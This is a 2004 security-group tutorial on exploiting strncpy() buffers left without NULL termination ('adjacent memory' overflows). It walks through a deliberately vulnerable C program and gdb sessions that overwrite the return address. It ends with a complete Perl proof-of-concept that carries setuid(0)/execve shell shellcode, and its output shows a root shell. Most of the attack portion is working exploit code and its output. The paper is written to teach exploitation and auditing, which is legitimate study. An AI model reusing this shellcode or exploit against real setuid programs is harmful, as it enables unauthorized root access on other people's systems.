@@ -1,0 +1,333 @@
+  _____ _
+|  ___| | _____      ___
+| |_  | |/ _ \ \ /\ / /                 -= www.flowsecurity.org =-
+|  _| | | (_) \ V  V /
+|_|   |_|\___/ \_/\_/          EXPLORING ADJACENT MEMORY AGAINST strncpy()
+     Security Group.			     English version
+
+
+Thu Dec  9 19:38:12 CET 2004
+Author: Carlos Carvalho - nuTshell@flowsecurity.org
+English revision: lewney 
+
+---------------------------------------------------------------
+SECTION:
+1 - Requirements for reading this paper
+2 - What is adjacent memory and why can it form a security risk
+3 - Using gdb
+4 - Exploring
+5 - Conclusions
+6 - References
+7 - Greetz
+----------------------------------------------------------------
+
+
+1) Requirements for reading this paper
+
+ You must know how basic buffer overflows occur. Further more you must
+know some Perl, a bit of C and how GDB (GNU debugger) works. If you dont
+fill these requirements I suggest you to read papers on each of these topics
+before reading this paper.
+
+2 ) What is adjacent memory and why can it form a security risk
+
+  Some advanced methods that take advantage of vulnerable functions like
+ strncpy() are not as well documented as basic stack overflows. 
+Adjacent memory overflows is one of these methods.
+   Adjacent memory overflows normally occur by cause of a bad programming 
+style strncpy(), however this is not the only 
+vulnerable function. I will focus on strncpy() as example for this paper.
+
+  strncpy() performs bounds checking and seems to be secure when speaking in 
+terms of normal buffer overflows. However if the programmer 
+is careless, it can be exploited with the adjacent memory method. 
+This occurs when a string is the same size as the
+limit of the buffer itself thus not being NULL (0x00) terminated:
+
+If:    char buffer[256]
+If:    input string = 256 bytes
+Then:  no NULL termination at all
+
+Seeing as the buffer is not NULL terminated, we have closed the gap between 
+the memory used by $ARGV[0] and $ARGV[1] (perl's way). 
+ However when the buffer is NULL terminated we would not 
+be able to manipulate data.
+
+Exploiting the closed gap between the two buffers is similair to a simple stack overflow.
+ We simply change the return address (%eip) and make it point to our 
+malicious code and voila: we have a shell!
+
+Example of a vulnerable code taken from mercy (mercy@dtors.net)
+
+----------- cut here -----------
+#include <stdio.h>
+
+int main(int argc, char **argv)
+{
+char copy_buff[263];
+char exploit_string[1024];   /*second buffer  $ARGV[1]*/
+char vuln_array[256];        /*first buffer $ARGV[0]*/
+
+     if(argc <= 2){
+         printf("%s\n","Use arg1 arg2");
+         exit(0);
+      }
+
+strncpy(vuln_array, argv[1], sizeof(vuln_array)); /*vulnerable function where we will write 256 bytes as defined in char vuln_array[256]*/
+strncpy(exploit_string, argv[2], sizeof(exploit_string)); /*overflow will take place here*/
+sprintf(copy_buff,"MSG: %s\n",vuln_array);
+printf("%s\n",copy_buff);
+return(0);
+}
+----------- cut here -----------
+
+  Note that function:
+  - strncpy(vuln_array, argv[1], sizeof(vuln_array))
+  does not require null termination,
+  giving us a window of opportunity.
+
+3) Using GDB:
+
+Notes:
+
+1) Before we continue I need to explain that i removed some parts of the 
+output gdb produced, so that we just use the information we need.
+
+2) On gdb output you may find some comments "#" these 
+are there to clear up things.
+
+Continuing...
+
+  In the first example we write 255 bytes to the vuln_array`s buffer, 1 less 
+than the limit of 256 and then we'll debug it, observing what happens to %esp
+register just after data input, but before one we continue one remark:
+
+- Whenever a buffer is not filled completely with user input, null bytes 
+will be concenated to the buffer.
+
+ Now some gdb output:
+
+---------- GDB BEGIN -----------
+[nuTshell@localhost ~]$ gdb -q ./vuln
+(gdb) disas main
+bla
+bla
+bla
+0x8048471 <main+177>:   ret
+0x8048472 <main+178>:   nop
+0x8048473 <main+179>:   nop
+End of assembler dump.
+(gdb) break *0x8048471  # breakpoint at ret.
+Breakpoint 1 at 0x8048471
+(gdb) r `perl -e 'print "A"x255'` `perl -e 'print "B"x256'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/hash/Programming/Underground_Area/adjacent/vuln 
+`perl
+-e 'print "A"x255'` `perl -e 'print "B"x200'`
+MSG:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 1, 0x08048471 in main ()
+(gdb) x/200xb $esp-200
+bla
+bla
+bla
+0xbffffa74:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffffa7c:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffffa84:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffffa8c:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffffa94:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffffa9c:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffffaa4:     0x41  ->0x00<-  0x42    0x42    0x42    0x42    0x42    0x42
+0xbffffaac:     0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
+0xbffffab4:     0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
+
+------------- GDB END-------------------
+
+ Take a look at 0xbffffaa4, it is clear it is NULL (0x00) terminated by the 
+strncpy(), followed by 0x42, "B" in hexadecimal.
+ It's a good habit to fill buffers with characters as: A, B, C as these can 
+be easily tracked in GDB (resp. 0x41, 0x42, 0x43)
+
+ So now what happens if we put 56 bytes in the first buffer?
+ Let`s find out:
+
+---------- GDB BEGIN -----------
+
+(gdb) r `perl -e 'print "A"x256'` `perl -e 'print "B"x200'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/hash/Programming/Underground_Area/adjacent/vuln 
+`perl
+-e 'print "A"x256'` `perl -e 'print "B"x200'`
+MSG:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+
+Breakpoint 1, 0x08048471 in main ()
+(gdb) x/200xb $esp-200
+bla
+bla
+bla
+0xbffff7a4:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffff7ac:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffff7b4:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffff7bc:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffff7c4:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffff7cc:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffff7d4:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffff7dc:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffff7e4:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffff7ec:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffff7f4:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffff7fc:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffff804:     0x41    0x42    0x42    0x42    0x42    0x42    0x42    0x42
+0xbffff80c:     0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
+0xbffff814:     0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
+
+------------ GDB END ----------------
+
+ Well well well... do you see any 0x00 between 0x41 and 0x42? Neither do i!
+ The NULL byte gap between $ARGV[0] and $ARGV[1] has 
+been overwritten by our data.
+The buffer overflow seems to occur at the 
+second buffer, however this is but an illusion,it overflows at 
+the first buffer because there is no null byte any more and processor 
+handles this as one data input, thus: Overflow!
+
+4) Exploring:
+
+Now that we have created a window of opportunity. Let's explore it!
+
+------------ GDB BEGIN -----------------
+
+[nuTshell@localhost ~]$ gdb -q ./vuln
+(gdb) r `perl -e 'print "A"x256'` `perl -e 'print "B"x25'`
+Starting program: /home/hash/Programming/Underground_Area/adjacent/vuln 
+`perl -e 'print "A"x256'` `perl -e 'print "B"x25'`
+MSG: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBB
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000a4242 in ?? ()
+(gdb) i r ebp
+ebp            0x41414141       0x41414141
+
+------------ GDB END -------------------------
+
+  %ebp register has been completly overwritten and %eip 
+was partially overwritten by 2 bytes -> 0x000a4141 .
+
+  This way it is easy to discover that if we put 27 bytes in the second buffer
+the return address will be completly filled up with our malicious address.
+
+  In the previous example we used 25 bytes and %eip was overwritten by 2 
+bytes. (I must note that I have changed my buffer input
+a couple of times just to get the exact buffer size).
+
+  Below is the exploit (Proof of Concept) for our vulnerable code:
+
+---------- cut here ------------
+#!/usr/bin/perl
+#
+# Example POC exploiting adjacent memory spaces
+# ./vuln `perl -e 'print "A"x256'` `perl -e 'print "B"x23'`
+# `perl -e 'print "C"x4'` <- here we overwrite ret!
+#  *remember what i told you about using A, B, C...?
+#
+# strncpy() vulnerable function
+#
+# Author: Carlos Carvalho length@flowsecurity.org
+
+$shellcode = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80". #setuid0
+             "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69".
+             "\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
+$path = "./vuln";
+
+$shelladdr = 0xbffffffa - length($shellcode) - length($path); #Calculate the memory address of the shellcode.
+
+$ret = pack("l",$shelladdr);
+
+$buffer1 = "\x90"x256;  #fill the first buffer with 256 nops.
+$buffer2 .= "\x90"x23;  #fill the second buffer with 23 nops.
+$buffer2 .= $ret;       #the last 4 bytes are filled by our $shellcode 
+address.
+
+local($ENV{"HACK"}) = $shellcode; #"HACK" env receives $shellcode.
+
+printf("Adjacent Memory local overflow by nuTshell\n");
+exec("$path $buffer1 $buffer2"); #Execute vuln with first and second 
+buffers.
+-------- cut here -----------
+
+Note: size of $ARGV[1] may vary from system to system, example:
+
+- Slackware 9.1 2.4.26, gcc version 3.2.3 = $buffer2 .=> "\x90"x23;
+- RedHat 8.0 2.4.18-14, gcc 3.2 = $buffer2 .=> "\x90"x23;
+- Conectiva 8.0 2.4.18-2cl, gcc  2.95.3 => $buffer2 .= "\x90"x7;
+
+ You can test it by using gdb as in the above 
+examples, increasing and decreasing the size of our second argument 
+progressively and checking what happens to the %eip register.
+
+ Now lets try to execute our exploit and see what happens. The exploit will 
+gain root as the vuln code has been made setuid (chmod +s vuln):
+
+-------------------------------------------------------
+[nuTshell@localhost ~]$ ./adjacent.pl
+Adjacent Memory local overflow by nuTshell
+MSG: Òÿÿ¿
+
+sh-2.05b# id
+uid=0(root) gid=500(nuTshell) groups=500(nuTshell),10(wheel)
+sh-2.05b# exit
+exit
+[nuTshell@localhost~]$
+-------------------------------------------------------
+
+
+5) Conclusions:
+
+  If you have read this document and you still find the technique very hard 
+I suggest you read the paper again and again untill you 
+completely understand and master the method used.
+
+  If you already have had some experience exploiting simple buffer overflows 
+and auditing then maybe you have passed code containing 
+such a flaw while auditing but you failed to see the flaw.
+
+I really hope this paper will be useful in the aid of your understanding of 
+the exploitation of adjacent memory flaws as these are not well
+documented.
+
+
+6) References:
+
+http://www.subterrain.net/overflow-papers/adv.overflow.paper.txt
+http://www.infosecwriters.com/texts.php?op=display&id=140
+http://www.cosc.brocku.ca/~cspress/HelloWorld/1999/04-apr/attack_class.html
+http://www.l0t3k.net/biblio/shellcode/en/Writing_shellcode.html
+http://www.phrack.org/phrack/56/p56-0x0e
+
+
+7) Greetz:
+
+################################################################
+#							       #
+# - Flowsecurity team;					       #
+#							       #
+# - People from irc.flowsecurity.org;                          #
+#  							       #
+# - Friends:						       #
+#   lewney for helping me to translate this paper to english.  #
+#   Many other friends ;)    	                               #
+#          			                               #
+################################################################
+
+
+
+
